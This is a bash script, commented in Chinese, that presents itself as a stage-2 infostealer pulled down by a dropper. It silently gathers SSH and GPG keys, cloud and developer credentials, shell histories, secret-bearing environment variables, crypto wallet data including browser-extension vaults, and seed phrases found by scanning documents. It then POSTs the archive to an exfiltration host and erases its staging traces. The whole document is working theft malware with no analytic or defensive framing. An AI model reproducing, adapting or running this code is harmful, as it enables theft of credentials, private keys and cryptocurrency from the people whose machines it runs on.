#!/bin/bash
# ==============================================================================
#  stage2 采集器 —— 由 stage1 dropper 从服务器拉取并执行
#
#  设计要点：
#    - 全程静默，stderr/stdout 全部吞掉
#    - 单项文件有大小上限，总包有上限，避免上传卡住
#    - 缺什么跳过什么，绝不因为某个路径不存在而中断
#    - 最后打成一个 tar.gz，POST 回接收端
#
#  用法：
#    curl -s HOST:PORT | sh
#  或：
#    EXFIL=1.2.3.4:8080 sh harvester.sh
# ==============================================================================

EXFIL="${EXFIL:-__EXFIL__}"
TAG="${TAG:-$(hostname 2>/dev/null | tr -cd 'A-Za-z0-9._-')}"
STAGE="/tmp/.$TAG.$$"
MAX_ITEM=2097152          # 单文件 2 MB
MAX_TOTAL=52428800        # 总包 50 MB

mkdir -p "$STAGE" 2>/dev/null || exit 0
cd "$STAGE" 2>/dev/null || exit 0

H="$HOME"

# ------------------------------------------------------------------ 工具函数
# 把单个文件/目录收进来，保留相对结构，超限就跳过
grab() {
    local src="$1" dst="$2"
    [ -e "$src" ] || return 0
    [ -r "$src" ] || return 0
    mkdir -p "$(dirname "$dst")" 2>/dev/null
    if [ -d "$src" ]; then
        # 目录：逐个文件收，单文件限量
        find "$src" -type f -size -${MAX_ITEM}c 2>/dev/null | while read -r f; do
            rel="${f#$src/}"
            mkdir -p "$(dirname "$dst/$rel")" 2>/dev/null
            cp -p "$f" "$dst/$rel" 2>/dev/null
        done
    else
        sz=$(wc -c <"$src" 2>/dev/null || echo 0)
        [ "$sz" -le "$MAX_ITEM" ] && cp -p "$src" "$dst" 2>/dev/null
    fi
}

# 只收文本的一部分做样本（历史记录、大日志）
sample() {
    local src="$1" dst="$2" linecnt="${3:-2000}"
    [ -r "$src" ] || return 0
    mkdir -p "$(dirname "$dst")" 2>/dev/null
    tail -n "$linecnt" "$src" >"$dst" 2>/dev/null
}

# ============================================================ 一、SSH 与密钥
grab "$H/.ssh"                                   "ssh"
grab "$H/.gnupg"                                 "gnupg"
grab "$H/.p12"                                   "certs"
find "$H" -maxdepth 3 -type f \( -name "*.pem" -o -name "*.key" -o -name "*.p12" \
     -o -name "*.pfx" -o -name "*.jks" \) -size -${MAX_ITEM}c 2>/dev/null | while read -r f; do
    grab "$f" "keys/$(basename "$f")"
done

# ============================================================ 二、云凭证
grab "$H/.aws"                                   "cloud/aws"
grab "$H/.config/gcloud"                         "cloud/gcloud"
grab "$H/.azure"                                 "cloud/azure"
grab "$H/.aliyun"                                "cloud/aliyun"
grab "$H/.config/rclone"                         "cloud/rclone"
grab "$H/.config/doctl"                          "cloud/doctl"
grab "$H/.hcloud"                                "cloud/hcloud"
grab "$H/.config/heroku"                         "cloud/heroku"
grab "$H/.netrc"                                 "cloud/netrc"

# ============================================================ 三、代码托管与 CI
grab "$H/.gitconfig"                             "dev/gitconfig"
grab "$H/.git-credentials"                       "dev/git-credentials"
grab "$H/.npmrc"                                 "dev/npmrc"
grab "$H/.yarnrc"                                "dev/yarnrc"
grab "$H/.pypirc"                                "dev/pypirc"
grab "$H/.gem/credentials"                       "dev/gem-credentials"
grab "$H/.cargo/credentials.toml"                "dev/cargo-credentials"
grab "$H/.docker/config.json"                    "dev/docker-config.json"
grab "$H/.kube/config"                           "dev/kube-config"
grab "$H/.config/gh/hosts.yml"                   "dev/gh-hosts.yml"
grab "$H/.config/vercel"                         "dev/vercel"
grab "$H/.config/netlify"                        "dev/netlify"
grab "$H/.config/stripe"                         "dev/stripe"
grab "$H/.config/sentryclirc"                    "dev/sentry"
grab "$H/.terraformrc"                           "dev/terraformrc"
grab "$H/.config/terraform"                      "dev/terraform-d"

# ============================================================ 四、Shell 历史
sample "$H/.zsh_history"        "history/zsh_history" 4000
sample "$H/.bash_history"       "history/bash_history" 4000
sample "$H/.sh_history"         "history/sh_history" 2000
sample "$H/.python_history"     "history/python_history" 1000
sample "$H/.node_repl_history"  "history/node_repl_history" 1000
sample "$H/.psql_history"       "history/psql_history" 1000
sample "$H/.mysql_history"      "history/mysql_history" 1000

# ============================================================ 五、环境变量
env 2>/dev/null | grep -iE "key|token|secret|pass|cred|auth|api|wallet|mnemonic|seed|priv" \
    >"env-filtered.txt" 2>/dev/null

# ============================================================ 六、★ 加密钱包
W="$H/Library/Application Support"

# --- 桌面钱包本体 ---
grab "$W/Exodus"                                "wallets/exodus"
grab "$W/exodus"                                "wallets/exodus-lc"
grab "$W/Electrum"                              "wallets/electrum-appsupport"
grab "$H/.electrum"                             "wallets/electrum-home"
grab "$W/Coinomi"                               "wallets/coinomi"
grab "$W/atomic"                                "wallets/atomic"
grab "$W/Atomic"                                "wallets/atomic-lc"
grab "$W/Bitcoin"                               "wallets/bitcoin-core"
grab "$W/Ethereum"                              "wallets/ethereum-geth"
grab "$H/.ethereum"                             "wallets/ethereum-home"
grab "$W/Ledger Live"                           "wallets/ledger-live"
grab "$W/Trezor Suite"                          "wallets/trezor-suite"
grab "$W/Wasabi Wallet"                         "wallets/wasabi"
grab "$H/.bitcoin"                              "wallets/bitcoin-home"
grab "$H/.litecoin"                             "wallets/litecoin"
grab "$H/.dogecoin"                             "wallets/dogecoin"
grab "$H/.monero"                               "wallets/monero"

# --- 浏览器扩展钱包（LevelDB 里的加密 vault，可离线爆破密码）---
for BR in \
    "Google/Chrome" \
    "BraveSoftware/Brave-Browser" \
    "Microsoft Edge" \
    "Chromium" \
    "Vivaldi" \
    "Arc/User Data"
do
    for PROF in Default Profile\ 1 Profile\ 2 Profile\ 3 Profile\ 4; do
        for EXT in \
            nkbihfbeogaeaoehlefnkodbefgpgknn \
            egjidjbpglichdcondbcbdnbeeppgdph \
            bfnaelmomeimhlpmgjnjophhpkkoljpa \
            acmacodkjbdgmoleebolmdjonilkdbch \
            fhbohimaelbohpjbbldcngcnapndodjp \
            hnifbagmdatjbhpeidckjbkgbndmodjh \
            dmkamcknogkgcdfhhbddcghachkejeap
        do
            grab "$W/$BR/$PROF/Local Extension Settings/$EXT" \
                 "wallets/ext/$BR/$PROF/$EXT"
        done
        # 扩展的 IndexedDB（部分钱包存这里）
        grab "$W/$BR/$PROF/IndexedDB" "wallets/ext-idb/$BR/$PROF" 2>/dev/null
    done
done

# --- 其他桌面/CLI 钱包 ---
grab "$W/Phantom"                               "wallets/phantom"
grab "$W/Solflare"                              "wallets/solflare"
grab "$W/Backpack"                              "wallets/backpack"
grab "$H/.config/solana"                        "wallets/solana-cli"
grab "$H/.near-credentials"                     "wallets/near"
grab "$H/.terra"                                "wallets/terra"
grab "$H/.osmosisd"                             "wallets/osmosis"
grab "$H/.injectived"                           "wallets/injective"
grab "$H/.axelard"                              "wallets/axelar"
grab "$H/.gaia"                                 "wallets/cosmos"
grab "$H/.sei"                                  "wallets/sei"
grab "$H/.sui"                                  "wallets/sui"
grab "$H/.aptos"                                "wallets/aptos"

# --- 任意位置的 keystore / 钱包文件 ---
find "$H" -maxdepth 5 -type f \
     \( -name "keystore*.json" -o -path "*/keystore/UTC--*" \
        -o -name "wallet.dat" -o -name "*.wallet" -o -name "seed.seco" \
        -o -name "wallet-encrypted.json" -o -name "id.json" \
        -o -name "*.keystore" -o -name "etherwallet*" \) \
     -size -${MAX_ITEM}c 2>/dev/null | while read -r f; do
    grab "$f" "wallets/found/$(echo "$f" | md5 2>/dev/null || echo "$f" | cksum | cut -d' ' -f1)"
done

# ============================================================ 七、★ 助记词扫描
# BIP39 常见词样本（用于打分，不需要全 2048 个）
SAMPLE_WORDS="abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact artist artwork ask aspect assault asset assist assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis"

is_mnemonic() {
    # 输入：一行文本；输出：0=像助记词 1=不像
    local line="$1"
    local n w inlist=0 total=0
    n=$(echo "$line" | wc -w | tr -d ' ')
    [ "$n" = "12" ] || [ "$n" = "24" ] || [ "$n" = "15" ] || [ "$n" = "18" ] || return 1
    for w in $line; do
        # 只接受 3-8 位纯小写字母
        echo "$w" | grep -qE '^[a-z]{3,8}$' || return 1
        total=$((total+1))
        case " $SAMPLE_WORDS " in
            *" $w "*) inlist=$((inlist+1)) ;;
        esac
    done
    # 至少一半命中样本词就认为可疑
    [ "$inlist" -ge $((total/2)) ] && return 0
    return 1
}

SCAN_DIRS="$H/Documents $H/Desktop $H/Downloads $H/Notes $H/Dropbox $H/Documentos"
: >"mnemonics.txt" 2>/dev/null
for D in $SCAN_DIRS; do
    [ -d "$D" ] || continue
    find "$D" -type f -size -2M 2>/dev/null | head -400 | while read -r f; do
        case "$f" in
            *.txt|*.md|*.rtf|*.csv|*.json|*.log|*.bak|*.old|*.doc|*.text)
                tr -d '\r' <"$f" 2>/dev/null | while IFS= read -r line; do
                    if is_mnemonic "$line"; then
                        echo "=== $f ===" >>"$STAGE/mnemonics.txt"
                        echo "$line"       >>"$STAGE/mnemonics.txt"
                    fi
                done
                ;;
        esac
    done
done

# 历史记录里也扫一遍
for HF in "$H/.zsh_history" "$H/.bash_history"; do
    [ -r "$HF" ] || continue
    tr -d '\r' <"$HF" 2>/dev/null | while IFS= read -r line; do
        if is_mnemonic "$line"; then
            echo "=== $HF ===" >>"$STAGE/mnemonics.txt"
            echo "$line"       >>"$STAGE/mnemonics.txt"
        fi
    done
done

# ============================================================ 八、系统指纹
{
    echo "hostname: $(hostname 2>/dev/null)"
    echo "user:     $(whoami 2>/dev/null)"
    echo "uid:      $(id -u 2>/dev/null)"
    echo "home:     $H"
    echo "os:       $(sw_vers 2>/dev/null | tr '\n' ' ')"
    echo "arch:     $(uname -m 2>/dev/null)"
    echo "date:     $(date 2>/dev/null)"
    echo "tty:      $(tty 2>/dev/null)"
    echo "shell:    $SHELL"
    echo "sshkeys:  $(ls -1 "$H/.ssh" 2>/dev/null | tr '\n' ' ')"
    echo "wallets:  $(ls -1 "$W" 2>/dev/null | grep -iE 'exodus|electrum|phantom|solflare|atomic|coinomi|bitcoin|ethereum|ledger|trezor|wasabi' | tr '\n' ' ')"
} >"fingerprint.txt" 2>/dev/null

# 可执行文件的 PATH 里有没有常见的钱包 CLI
which solana anchor cast forge near 2>/dev/null >"cli-tools.txt"

# ============================================================ 九、打包外发
cd "$STAGE" 2>/dev/null || exit 0
TOTAL=$(du -sk . 2>/dev/null | awk '{print $1}')
if [ "${TOTAL:-0}" -gt 51200 ]; then
    # 太大，只留高价值部分
    rm -rf wallets/ext-idb 2>/dev/null
    find . -type f -size +512k -delete 2>/dev/null
fi

# 打成一个包，POST 出去
if tar czf - . 2>/dev/null | curl -s --max-time 60 \
      -X POST --data-binary @- \
      -H "X-Tag: $TAG" \
      "http://$EXFIL/u/$TAG" ; then
    :
fi

# 清理现场
cd / 2>/dev/null
rm -rf "$STAGE" 2>/dev/null
exit 0
